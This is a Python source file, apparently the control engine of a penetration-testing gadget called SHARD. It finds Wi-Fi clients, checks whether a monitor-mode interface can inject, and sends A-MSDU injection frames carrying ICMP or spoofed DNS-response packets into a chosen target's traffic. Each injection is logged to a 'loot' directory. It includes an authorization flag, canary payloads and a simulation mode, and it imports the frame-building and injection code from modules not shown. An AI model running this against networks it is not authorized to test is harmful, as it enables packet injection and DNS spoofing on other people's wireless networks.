#!/usr/bin/env python3
"""SHARD engine -- owns the radio, the attack plan and loot logging.

The UI never touches the hardware. It reads a JSON state file and appends
commands to a JSONL command file, exactly like KEYSMITH on the Pager. This
keeps a slow injection or capture from freezing the 480x222 display.

Phases: idle -> discover -> probe -> plan -> inject -> verify -> done
"""

from __future__ import annotations

import json
import os
import tempfile
import time

from . import __version__
from . import discovery, frames, inject

STATE = os.environ.get("SHARD_STATE", "/tmp/shard_state.json")
CMD = os.environ.get("SHARD_CMD", "/tmp/shard_cmd.jsonl")
LOOT = os.environ.get("SHARD_LOOT", "/root/loot/shard")
IFACE = os.environ.get("SHARD_IFACE", "wlan1mon")
SIM = os.environ.get("SHARD_SIM", "").lower() in ("1", "true", "yes")


def default_state():
    return {
        "app": "SHARD",
        "version": __version__,
        "phase": "idle",
        "authorized": False,
        "iface": IFACE,
        "sim": SIM,
        "targets": [],
        "target_index": 0,
        "selected": {},
        "probe": {"os_ok": False, "air_ok": False, "checked": False},
        "attack": "amsdu",
        "inject_count": 0,
        "verified": False,
        "packets": [],
        "logs": ["SHARD ready -- authorize before targeting"],
        "error": "",
        "stats": {"injected": 0, "targets": 0, "injectable": 0},
        "updated": time.time(),
    }


def atomic_write(path, obj):
    directory = os.path.dirname(path) or "."
    os.makedirs(directory, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".shard-", dir=directory)
    try:
        with os.fdopen(fd, "w") as fh:
            json.dump(obj, fh, separators=(",", ":"), sort_keys=True)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def append_jsonl(path, obj):
    directory = os.path.dirname(path) or "."
    os.makedirs(directory, exist_ok=True)
    with open(path, "a") as fh:
        fh.write(json.dumps(obj, separators=(",", ":"), sort_keys=True) + "\n")


class Engine:
    def __init__(self, state_path=None, cmd_path=None, loot=None, iface=None,
                 sim=None):
        self.state_path = state_path or STATE
        self.cmd_path = cmd_path or CMD
        self.loot = loot or LOOT
        self.iface = iface or IFACE
        self.sim = SIM if sim is None else sim
        self.state = default_state()
        self.state["iface"] = self.iface
        self.state["sim"] = self.sim
        self.dirty = True

    # --- command plumbing --------------------------------------------------

    def load_commands(self):
        cmds = []
        try:
            with open(self.cmd_path, "r") as fh:
                lines = fh.readlines()
            with open(self.cmd_path, "w") as fh:
                fh.truncate(0)
        except FileNotFoundError:
            return cmds
        for line in lines:
            try:
                obj = json.loads(line)
                if isinstance(obj, dict):
                    cmds.append(obj)
            except Exception:
                pass
        return cmds

    def log(self, message):
        self.state["logs"] = (self.state.get("logs") or [])[-39:] + [str(message)]
        self.dirty = True

    # --- command handlers --------------------------------------------------

    def handle(self, cmd):
        action = str(cmd.get("cmd", "")).lower()
        self.state["error"] = ""

        if action == "authorize":
            self.state["authorized"] = bool(cmd.get("value", True))
            self.log("authorization %s" %
                     ("accepted" if self.state["authorized"] else "declined"))
        elif action == "discover":
            self.discover()
        elif action == "select":
            self.select(int(cmd.get("index", 0)))
        elif action == "probe":
            self.probe()
        elif action == "attack":
            mode = str(cmd.get("mode", "amsdu")).lower()
            if mode in ("amsdu", "dns", "icmp"):
                self.state["attack"] = mode
                self.log("attack mode=%s" % mode)
        elif action == "inject":
            self.inject(cmd)
        elif action == "verify":
            self.verify()
        elif action == "reset":
            fresh = default_state()
            fresh["authorized"] = self.state["authorized"]
            self.state = fresh
            self.log("reset")
        elif action == "shutdown":
            self.state["phase"] = "off"
            self.log("shutdown")
        self.dirty = True

    def discover(self):
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            self.log(self.state["error"])
            return
        self.state["phase"] = "discover"
        if self.sim:
            devices = discovery.sample_targets()
        else:
            devices = discovery.load_recon_devices()
            if not devices:
                pairs, err = discovery.sniff_data_frames(self.iface, duration=6)
                if err:
                    self.state["error"] = err
                devices = pairs
        enriched = []
        injectable = 0
        for d in devices:
            ok, _ = discovery.is_injectable_target(d)
            d["injectable"] = ok
            injectable += 1 if ok else 0
            enriched.append(d)
        self.state["targets"] = enriched
        self.state["stats"] = {
            "injected": self.state["inject_count"],
            "targets": len(enriched),
            "injectable": injectable,
        }
        self.log("discovered %d targets (%d injectable)" % (len(enriched), injectable))
        if enriched:
            self.select(0)
        else:
            self.state["phase"] = "idle"

    def select(self, index):
        targets = self.state.get("targets") or []
        if not 0 <= index < len(targets):
            self.state["error"] = "target index out of range"
            return
        target = dict(targets[index])
        self.state["target_index"] = index
        self.state["selected"] = target
        if not target.get("injectable", False):
            ok, reason = discovery.is_injectable_target(target)
            self.state["error"] = "target blocked: %s" % reason
        else:
            self.state["phase"] = "plan"
            self.log("selected %s ch%s" % (target.get("bssid", "?"),
                                           target.get("channel", "?")))
        self.dirty = True

    def probe(self):
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            return
        self.state["phase"] = "probe"
        if self.sim:
            result = {"iface": self.iface, "exists": True, "monitor": True,
                      "os_ok": True, "bytes": 38, "error": ""}
            air_ok = True
            air_detail = "simulated injection confirmed"
        else:
            result = inject.probe_raw(self.iface)
            air_ok, air_detail = inject.probe_aircrack(self.iface)
            if not result["os_ok"] and result["error"]:
                self.state["error"] = result["error"]
        self.state["probe"] = {
            "os_ok": bool(result.get("os_ok")),
            "air_ok": bool(air_ok),
            "checked": True,
            "iface": result.get("iface", self.iface),
            "monitor": result.get("monitor"),
            "detail": air_detail,
            "error": result.get("error", ""),
        }
        self.log("probe os=%s air=%s (%s)" % (result.get("os_ok"), air_ok,
                                              air_detail))
        self.dirty = True

    def _build_packet(self, target, cmd):
        mode = self.state["attack"]
        src = cmd.get("src_ip") or "192.168.1.1"
        dst = cmd.get("dst_ip") or ""
        if not dst:
            dst = discovery.read_dhcp_leases().get(
                (target.get("client") or "").lower(), "192.168.1.100")
        if mode == "dns":
            return frames.build_dns_response_response(
                src, dst, cmd.get("domain", "canary.shard.local"),
                cmd.get("answer_ip", "172.16.52.1"))
        if mode == "icmp":
            return frames.build_icmp_echo(src, dst)
        return frames.build_icmp_echo(src, dst, payload=b"SHARD-CANARY")

    def inject(self, cmd):
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            return
        target = self.state.get("selected") or {}
        if not target:
            self.state["error"] = "select a target first"
            return
        ok, reason = discovery.is_injectable_target(target)
        if not ok:
            self.state["error"] = "target blocked: %s" % reason
            return
        self.state["phase"] = "inject"
        channel = int(target.get("channel", 6))
        client = target.get("client") or "aa:bb:cc:dd:ee:01"
        bssid = target.get("bssid") or "00:11:22:33:44:55"
        packet = self._build_packet(target, cmd)
        frame = frames.build_amsdu_injection(
            client, bssid, packet, channel=channel,
            seq=self.state["inject_count"] + 1)

        if self.sim:
            sent = len(frame)
        else:
            channel_ok, channel_msg = inject.set_channel(self.iface, channel)
            if not channel_ok:
                self.state["error"] = channel_msg
                self.log(channel_msg)
                return
            try:
                with inject.Injector(self.iface) as inj:
                    sent = inj.send(frame)
            except inject.InjectionError as exc:
                self.state["error"] = str(exc)
                self.log("inject failed: %s" % exc)
                return

        self.state["inject_count"] += 1
        record = {
            "ts": time.time(),
            "bssid": bssid,
            "client": client,
            "channel": channel,
            "attack": self.state["attack"],
            "bytes": sent,
            "frame_hex": frame.hex(),
        }
        self.state["packets"] = (self.state.get("packets") or [])[-9:] + [record]
        self.state["stats"]["injected"] = self.state["inject_count"]
        self.state["phase"] = "verify"
        self.log("injected %d bytes to %s on ch%d" % (sent, client, channel))
        append_jsonl(os.path.join(self.loot, "injections.jsonl"), record)
        self.dirty = True

    def verify(self):
        if not self.state["inject_count"]:
            self.state["error"] = "nothing injected yet"
            return
        if self.sim:
            self.state["verified"] = True
            detail = "simulated canary observed"
        else:
            lines, err = inject.capture_response(self.iface, duration=4.0)
            if err:
                self.state["error"] = err
            self.state["verified"] = bool(lines)
            detail = "%d frames observed" % len(lines)
        self.state["phase"] = "done"
        self.log("verify: %s" % detail)
        append_jsonl(os.path.join(self.loot, "results.jsonl"), {
            "ts": time.time(),
            "verified": self.state["verified"],
            "detail": detail,
            "target": self.state.get("selected", {}),
        })
        self.dirty = True

    # --- loop --------------------------------------------------------------

    def tick(self):
        for cmd in self.load_commands():
            self.handle(cmd)
        self.state["updated"] = time.time()
        if self.dirty or self.state["phase"] != "idle":
            atomic_write(self.state_path, self.state)
            self.dirty = False

    def run_forever(self):
        while True:
            self.tick()
            if self.state["phase"] == "off":
                break
            time.sleep(0.15)
        atomic_write(self.state_path, self.state)


def run_forever():
    Engine().run_forever()


def selftest():
    d = tempfile.mkdtemp(prefix="shard-selftest-")
    e = Engine(os.path.join(d, "state.json"),
               os.path.join(d, "cmd.jsonl"),
               os.path.join(d, "loot"), sim=True)
    e.handle({"cmd": "authorize"})
    e.handle({"cmd": "discover"})
    e.handle({"cmd": "select", "index": 0})
    e.handle({"cmd": "probe"})
    e.handle({"cmd": "inject"})
    e.handle({"cmd": "verify"})
    print("phase=%s injected=%d verified=%s targets=%d" % (
        e.state["phase"], e.state["inject_count"],
        e.state["verified"], len(e.state["targets"])))


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "selftest":
        selftest()
    else:
        run_forever()
